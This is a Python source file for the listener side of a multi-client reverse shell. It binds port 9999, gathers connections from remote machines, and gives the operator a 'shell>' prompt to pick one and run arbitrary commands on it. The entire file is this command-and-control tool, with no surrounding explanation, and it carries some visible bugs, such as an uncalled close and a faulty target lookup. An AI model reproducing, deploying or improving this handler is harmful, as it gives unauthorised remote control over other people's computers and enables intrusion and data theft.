import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]  # 1: listen and accept, 2: send commands
queue = Queue()
connections = []
addresses = []


def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as e:
        print("Socket creation error " + str(e))


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host, port))
    except socket.error as e:
        print("Socket binding error " + str(e) + "\n" + ". Retrying...")
        bind_socket()


def socket_listen():
    s.listen(5)


def accept_connection():
    for connection in connections:
        connection.close

    del connections[:]
    del addresses[:]

    while True:
        try:
            connection, address = s.accept()
            connection.setblocking(True)

            connections.append(connection)
            addresses.append(address)

            print("Connection has been ebstablished! IP: " + str(address[0]) + " PORT: " + str(address[1]))
        except socket.error as e:
            print("Error accepting connection " + str(e))


def start_shell():
    while True:
        cmd = input("shell> ")
        if cmd == "list":
            list_connections()
        elif 'select' in cmd:
            id, target = get_target(cmd)

            if target is None:
                return

            print("You now connected to: " + str(addresses[id][0]))
            print(str(addresses[id][0]) + ">", end="")

            send_commands(target)
        else:
            print("Command not recognized")


def list_connections():
    print(" ---- Clients ---- " + "\n")
    print("{:<8} {:<15} {:<10}".format('ID', 'IP', 'PORT') + "\n")

    for i, connection in enumerate(connections):
        try:
            connection.send(str.encode(" "))
            connection.recv(201480)
        except:
            del connections[i]
            del addresses[i]
            continue

        print("{:<8} {:<15} {:<10}".format(str(i), str(addresses[i][0]), str(addresses[i][1])) + "\n")


def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        return target, connections[target]
    except:
        print("Selection not valid")


def send_commands(connection):
    while True:
        try:
            cmd = input().strip()

            if cmd == "exit":
                break

            if len(cmd) == 0:
                continue

            connection.send(str.encode(cmd))
            client_response = str(connection.recv(20480), "utf-8")
            print(client_response, end="")
        except:
            print("Error sending commands")
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # end threads when process stops
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            socket_listen()
            accept_connection()
        elif x == 2:
            start_shell()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
